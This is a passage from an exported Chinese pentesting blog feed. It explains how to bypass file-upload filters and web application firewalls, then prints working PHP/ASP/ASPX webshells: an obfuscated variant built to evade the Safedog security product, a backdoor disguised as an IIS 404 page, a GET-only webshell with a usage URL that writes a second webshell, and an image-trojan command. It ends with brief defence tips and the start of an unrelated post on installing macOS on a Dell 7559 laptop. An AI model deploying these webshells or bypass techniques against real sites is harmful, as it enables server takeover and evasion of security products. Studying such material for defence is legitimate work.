title="多个分号"></a>多个分号</h4><ul><li>多个分号,文件解析时，可能解析不到文件名，导致绕过。</li></ul><pre><code>Content-Disposition: form-data; name=&quot;file&quot;;;; filename=&quot;xx.php&quot;</code></pre><h4 id="在boundary前添加任意字符"><a href="#在boundary前添加任意字符" class="headerlink" title="在boundary前添加任意字符"></a>在<code>boundary</code>前添加任意字符</h4><ul><li>如下,在<code>boundary</code>前添加<code>bypass</code>,php支持,java报错</li></ul><pre><code>Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</code></pre><h4 id="去掉或修改Content-Disposition值"><a href="#去掉或修改Content-Disposition值" class="headerlink" title="去掉或修改Content-Disposition值"></a>去掉或修改<code>Content-Disposition</code>值</h4><ul><li>有的WAF在解析的时候，认为<code>Content-Disposition</code>值一定是<code>form-data</code>，造成绕过。</li></ul><pre><code>Content-Disposition: name=&#39;file_x&#39;; filename=&#39;xx.php&#39;</code></pre><h4 id="去掉引号"><a href="#去掉引号" class="headerlink" title="去掉引号"></a>去掉引号</h4><pre><code>Content-Disposition: form-data; name=file; filename=&quot;xx.php&quot;Content-Disposition: form-data; name=&quot;file&quot;; filename=xx.phpContent-Disposition: form-data; name=file; filename=xx.php</code></pre><h4 id="双引号变成单引号"><a href="#双引号变成单引号" class="headerlink" title="双引号变成单引号"></a>双引号变成单引号</h4><pre><code>Content-Disposition: form-data; name=&#39;file&#39;; filename=&#39;xx.php&#39;</code></pre><p>单引号、双引号、不要引号，都能上传。</p><h3 id="NTFS-ADS特性"><a href="#NTFS-ADS特性" class="headerlink" title="NTFS ADS特性"></a>NTFS ADS特性</h3><ul><li>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647273_580289876_1536893321" alt></p><h3 id="其他情况补充"><a href="#其他情况补充" class="headerlink" title="其他情况补充"></a>其他情况补充</h3><h4 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h4><ul><li>修改上传的文件名为超长文件名。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221344.png" alt></p><ul><li>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。  </li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221555.png" alt></p><h4 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h4><ul><li>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br><code>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</code></li></ul><h4 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h4><ul><li>将下图<code>file1</code>改成了<code>file4</code>，这样就不会把这个文件删除了。（JCMS漏洞）  </li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221521.png" alt></p><h4 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h4><ul><li>修改上传文件内容，在内容中加很多<code>注释</code>，据说文件大小达到<code>1.5m</code>时，安全狗不在检测。</li></ul><h4 id="文件名空字符"><a href="#文件名空字符" class="headerlink" title="文件名空字符"></a>文件名空字符</h4><ul><li>在<code>:`` ;</code> <code>=</code>添加1个或者多个空格,如在<code>filename=</code>后面加上<code>空格</code>，<code>TAB</code>等空字符再跟上文件名，可以绕过dog的上传检测。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221441.png" alt></p><h4 id="空字符"><a href="#空字符" class="headerlink" title="空字符"></a>空字符</h4><ul><li>在分号的前后加上一定数量的<code>TAB</code>，在测试中是加入了466个TAB字符，可以绕过dog的上传检测。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221421.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="轻量级检测绕过"><a href="#轻量级检测绕过" class="headerlink" title="轻量级检测绕过"></a>轻量级检测绕过</h3><ol><li>绕过前端JavaScript检测：使用Burp抓包改包。</li><li>绕过服务器端MIME类型检测：使用Burp抓包改包。</li></ol><h3 id="路径-文件扩展名检测绕过"><a href="#路径-文件扩展名检测绕过" class="headerlink" title="路径/文件扩展名检测绕过"></a>路径/文件扩展名检测绕过</h3><ol><li>黑名单检测方式</li></ol><pre><code>文件名大小写绕过；名单列表绕过；特殊文件名绕过；0x00截断绕过；.htaccess文件攻击；本地文件包含漏洞；Apache解析漏洞；IIS解析漏洞；Nginx解析漏洞；</code></pre><ol start="2"><li>白名单检测方式</li></ol><pre><code>0x00截断绕过；本地文件包含漏洞；Apache解析漏洞；IIS解析漏洞；Nginx解析漏洞；</code></pre><h3 id="文件内容检测方式"><a href="#文件内容检测方式" class="headerlink" title="文件内容检测方式"></a>文件内容检测方式</h3><p>对文件进行恶意代码注入，再配合解析漏洞。</p><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><ol><li><p>php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>‘key’<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"a"</span><span class="token punctuation">.</span><span class="token string">"s"</span><span class="token punctuation">.</span><span class="token string">"s"</span><span class="token punctuation">.</span><span class="token string">"e"</span><span class="token punctuation">.</span><span class="token string">"r"</span><span class="token punctuation">.</span><span class="token string">"t"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre></li><li><p>asp</p><pre><code>&lt;% eval request(“key”)%&gt;</code></pre></li><li><p>aspx</p><pre><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;key&quot;],&quot;unsafe&quot;);%&gt;</code></pre></li></ol><h3 id="php过狗一句话"><a href="#php过狗一句话" class="headerlink" title="php过狗一句话"></a>php过狗一句话</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>   <span class="token variable">$mt</span><span class="token operator">=</span><span class="token string">"JF9QT1N"</span><span class="token punctuation">;</span>   <span class="token variable">$ojj</span><span class="token operator">=</span><span class="token string">"QGV2YWwo"</span><span class="token punctuation">;</span>  <span class="token variable">$hsa</span><span class="token operator">=</span><span class="token string">"UWydpMGle"</span><span class="token punctuation">;</span>  <span class="token variable">$fnx</span><span class="token operator">=</span><span class="token string">"5BeSleleddKTs="</span><span class="token punctuation">;</span>  <span class="token variable">$zk</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"sdtdrd_redpdldadcde"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$ef</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dva</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token variable">$zvm</span> <span class="token operator">=</span> <span class="token variable">$dva</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$zvm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>分析：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$zk</span> <span class="token operator">=</span> <span class="token string">"str_replace"</span><span class="token punctuation">;</span><span class="token variable">$ef</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"zbazsze64_zdzeczodze"</span><span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token string">"base64_decode"</span><span class="token variable">$dva</span> <span class="token operator">=</span> <span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">"pcprpepaptpe_fpupnpcptpipopn"</span><span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token string">"create_function"</span><span class="token variable">$zvm</span> <span class="token operator">=</span> <span class="token variable">$dva</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$ef</span><span class="token punctuation">(</span><span class="token variable">$zk</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$ojj</span><span class="token punctuation">.</span><span class="token variable">$mt</span><span class="token punctuation">.</span><span class="token variable">$hsa</span><span class="token punctuation">.</span><span class="token variable">$fnx</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"le"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> QGV2YWwoJF9QT1NUWydpMGle5BeSleleddKTs<span class="token operator">=</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">"QGV2YWwoJF9QT1NUWydpMG5BeSddKTs="</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">"@eval($_POST['i0nAy']);"</span><span class="token punctuation">)</span></code></pre><p>过狗一句话总结为：<strong>打乱字符；编码技术；拆分组合；创建，匹配</strong>。</p><h3 id="变形的一句话"><a href="#变形的一句话" class="headerlink" title="变形的一句话"></a>变形的一句话</h3><pre><code>&lt;?php ($_=@$\_GET\[2\]).@$\_($_POST\[sz\])?&gt;&lt;?php $a = str\_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($\_POST\[&quot;sz&quot;\]); ?&gt;&lt;?php $k=&quot;ass&quot;.&quot;ert&quot;; $k(${&quot;_PO&quot;.&quot;ST&quot;} \[&#39;sz&#39;\]);?&gt;&lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST\[&quot;sz&quot;\]); ?&gt;</code></pre><h3 id="404隐藏PHP后门"><a href="#404隐藏PHP后门" class="headerlink" title="404隐藏PHP后门"></a>404隐藏PHP后门</h3><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HEAD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TITLE</span><span class="token punctuation">></span></span></span>无法找到该页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TITLE</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>META</span> <span class="token attr-name">HTTP-EQUIV</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">Content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>GB2312<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>STYLE</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token constant">BODY</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 9pt<span class="token operator">/</span>12pt 宋体 <span class="token punctuation">}</span>    <span class="token constant">H1</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 12pt<span class="token operator">/</span>15pt 宋体 <span class="token punctuation">}</span>      <span class="token constant">H2</span> <span class="token punctuation">{</span> font<span class="token punctuation">:</span> 9pt<span class="token operator">/</span>12pt 宋体 <span class="token punctuation">}</span>        A<span class="token punctuation">:</span>link <span class="token punctuation">{</span> color<span class="token punctuation">:</span> red <span class="token punctuation">}</span>      A<span class="token punctuation">:</span>visited <span class="token punctuation">{</span> color<span class="token punctuation">:</span> maroon <span class="token punctuation">}</span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>STYLE</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HEAD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BODY</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TABLE</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span>500</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation">=</span>0</span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation">=</span>10</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TR</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TD</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>无法找到该页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>      您正在搜索的页面可能已经删除、更名或暂时不可用。      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>请尝试以下操作：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>确保浏览器的地址栏中显示的网站地址的拼写和格式正确无误。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>如果通过单击链接而到达了该网页，请与网站管理员联系，通知他们该链接的格式不正确。      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>单击<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.asp-muma.com/javascript:history.back(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>后退<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>按钮尝试另一个链接。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token constant">HTTP</span> 错误 <span class="token number">404</span> <span class="token operator">-</span> 文件或目录未找到。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>Internet 信息服务 <span class="token punctuation">(</span><span class="token constant">IIS</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>技术信息（为技术支持人员提供）<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>转到 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token punctuation">></span></span></span>Microsoft 产品支持服务<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>并搜索包括<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token constant">HTTP</span><span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>和<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token number">404</span><span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>的标题。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>打开<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span><span class="token constant">IIS</span> 帮助<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>（可在 <span class="token constant">IIS</span> 管理器 <span class="token punctuation">(</span>inetmgr<span class="token punctuation">)</span> 中访问），然后搜索标题为<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>网站设置<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>、<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>常规管理任务<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>和<span class="token operator">&amp;</span>ldquo<span class="token punctuation">;</span>关于自定义错误消息<span class="token operator">&amp;</span>rdquo<span class="token punctuation">;</span>的主题。<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TD</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TR</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TABLE</span><span class="token punctuation">></span></span></span>      <span class="token delimiter">&lt;?php</span>      @preg\<span class="token package">_replace</span><span class="token punctuation">(</span><span class="token string">"/\[checksql\]/e"</span><span class="token punctuation">,</span>$\<span class="token package">_POST<span class="token punctuation">\</span></span><span class="token punctuation">[</span><span class="token string">'cnsec'</span>\<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"saft"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'HTTP/1.1 404 Not Found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token delimiter">?></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>BODY</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223515.png" alt></p><h3 id="php面杀小马"><a href="#php面杀小马" class="headerlink" title="php面杀小马"></a>php面杀小马</h3><ul><li><p>小马如下:</p><pre><code>&lt;?php $_GET[a]($_GET[b]);?&gt;</code></pre></li><li><p>仅用<code>GET函数</code>就构成了木马,利用方法如下：</p></li></ul><pre><code>http://localhost:8081/test/a.php?a=assert&amp;b=${fputs%28fopen%28base64\_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29};</code></pre><ul><li>执行后当前目录生成<code>c.php</code>一句话木马，当传参<code>a</code>为<code>eval</code>时会报错</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223813.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309223823.png" alt></p><h2 id="图片木马制作"><a href="#图片木马制作" class="headerlink" title="图片木马制作"></a>图片木马制作</h2><ol><li><p>windows命令：</p><pre><code>copy /b 1.jpg+2.php</code></pre><p><code>1.jpg</code>即为图片木马</p></li><li><p><code>Edjpgcom</code>:<br>专业的图片木马制作工具,使用方法:<br>打开<code>edjpgcom.exe</code>所在文件夹，然后把你所要修改的图片<strong>拖动</strong>到<code>edjpgcom.exe</code>上面，然后<code>edjpgcom.exe</code>会自动打开，写入想要写的代码即可。</p></li></ol><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528562057_94708147_1536893280" alt></p><h2 id="文件上传防御"><a href="#文件上传防御" class="headerlink" title="文件上传防御."></a>文件上传防御.</h2><ul><li>轻量级检测必然能绕过</li><li>检测的重点放在文件内容检测</li><li>路径/扩展名检测一定要用白名单</li><li>不能有本地文件包含漏洞</li><li>随时注意更新Web应用软件</li></ul><ol><li>关掉上传文件的功能<br>如果Web应用程序不需要上传文件的功能，则可以直接将上传文件的功能关闭来避免不必要的麻烦。打开“php.ini”文件，找到file uploads的位置，将file_uploads设置成Off。</li><li>限制能够上传的文件大小<br>如果黑客采取连续不断地上传文件，或是上传极大的文件，来使Web应用程序没有更多资源来处理其他来访者的请求，黑客就可以借此来瘫痪网站。PHP的限制机制可以让您限制允许上传文件体积的最大值，来避免来访者上传太大的文件。单独POST请求的最大值，可以使用php.ini文件的upload_max_size来设置。打开“php.ini”文件，找到upload_max_size的位置，将upload_max_size设置成想要的值。</li><li>检查上传文件的类型</li><li>检查上传文件的内容</li><li>上传的文件不要保存在公开的文件夹内，以避免被黑客直接读取。另外将文件的路径隐藏起来，或是将文件名称改成没有扩展名的随机文件名，都可以增加上传文件的安全性</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dell-7559-10.14.3-黑苹果</title>
      <link href="/2019/02/14/dell-7559-10-14-3-hei-ping-guo/"/>
      <url>/2019/02/14/dell-7559-10-14-3-hei-ping-guo/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="7559黑苹果"><a href="#7559黑苹果" class="headerlink" title="7559黑苹果"></a>7559黑苹果</h1><blockquote><p>参考链接: <a href="http://bbs.pcbeta.com/viewthread-1794485-1-1.html" target="_blank" rel="noopener">Dell 7559 安装10.14GM教程（i5+UEFI）</a><br>这位大佬的教程已经很完善了,只不过本人是小白,所以对这位大佬的教程进行了一些补充,如果你已经按照他的教程安装完成了,现在是10.14或者10.14.1,你需要做的就是 <strong>升级到现在最新的10.14.3,然后跳到 0x05蓝牙不可关闭修复开始</strong></p></blockquote><ul><li>好吧,废话少说,先看看效果然后再决定往下看</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128210751.png" alt></p><a id="more"></a><ol><li><p>声卡完美,耳机自动切换,笔记本快捷键,<code>F1</code>静音,<code>F2</code>调低声音和<code>F3</code>调高声音</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128210835.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211546.png" alt></p></li><li><p>背光可调,也就是所谓的小太阳,笔记本快捷键<code>Fn+F1</code>和<code>Fn+F2</code></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211525.png" alt></p></li><li><p>USB3.0驱动成功</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211704.png" alt></p></li><li><p>蓝牙可用</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211735.png" alt></p></li><li><p>睡眠可用,电量正常显示</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211818.png" alt></p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128211908.png" alt></p></li><li><p>摄像头可用,使用mac自带的<code>Photo Booth</code>检测</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128212148.png" alt></p></li><li><p>独显已经屏蔽</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128212230.png" alt></p></li><li><p>可变频,测试软件<a href="https://software.intel.com/en-us/articles/intel-power-gadget-20" target="_blank" rel="noopener">Intel Power Gadget</a>和<a href="http://bbs.pcbeta.com/viewthread-1698338-1-1.html" target="_blank" rel="noopener">cpu-s</a>,这两个软件我已经下载好放在附件中了</p><p> <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190128213353.png" alt></p></li></ol><h2 id="电脑配置"><a href="#电脑配置" class="headerlink" title="电脑配置"></a>电脑配置</h2><ul><li>CPU: i7-6700HQ</li><li>内存: DDR3L 1600MHz *2</li><li>硬盘: 128G+1T</li><li>显卡: GTX960M 4G + Intel HD Graphics 530</li><li>声卡: 